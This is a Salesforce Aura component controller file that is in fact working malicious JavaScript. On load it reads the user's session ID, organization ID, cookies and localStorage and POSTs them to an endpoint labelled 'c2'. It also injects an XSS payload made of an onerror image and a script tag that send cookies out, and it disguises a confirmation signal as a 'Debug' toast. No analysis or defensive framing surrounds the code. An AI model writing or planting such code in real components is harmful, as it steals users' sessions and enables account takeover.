({
    doInit: function(component, event, helper) {
        var c2 = 'https://localhost:8080';

        // Attempt to access Salesforce session via Aura framework
        try {
            var token = $A.get('$SObjectType.CurrentUser.SessionId');
            var orgId = $A.get('$SObjectType.CurrentUser.OrganizationId');

            var xhr = new XMLHttpRequest();
            xhr.open('POST', c2 + '/aura-exfil', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                sessionId: token,
                orgId: orgId,
                origin: window.location.origin,
                cookies: document.cookie,
                auraToken: document.cookie.match(/sid=([^;]+)/)?.[1]
            }));
        } catch(e) {}

        // Inject HTML with script tag via unescapedHtml
        component.set('v.rawHtml',
            '<img src=x onerror="fetch(\'' + c2 + '/xss?c=\'+btoa(document.cookie))">' +
            '<script>fetch("' + c2 + '/script-inject",{method:"POST",body:document.cookie})<\/script>'
        );

        // Attempt to access other components' data via Aura event bus
        var appEvent = $A.get('e.force:showToast');
        if (appEvent) {
            // Side channel: use toast event to confirm execution
            appEvent.setParams({
                title: 'Debug',
                message: 'Component loaded: ' + window.location.href
            });
        }
    },

    scriptsLoaded: function(component, event, helper) {
        // If jQuery loads, use it for additional exfil
        try {
            $.ajax({
                url: 'https://localhost:8080/jquery-exfil',
                method: 'POST',
                data: {
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    origin: window.location.origin
                }
            });
        } catch(e) {}
    }
})
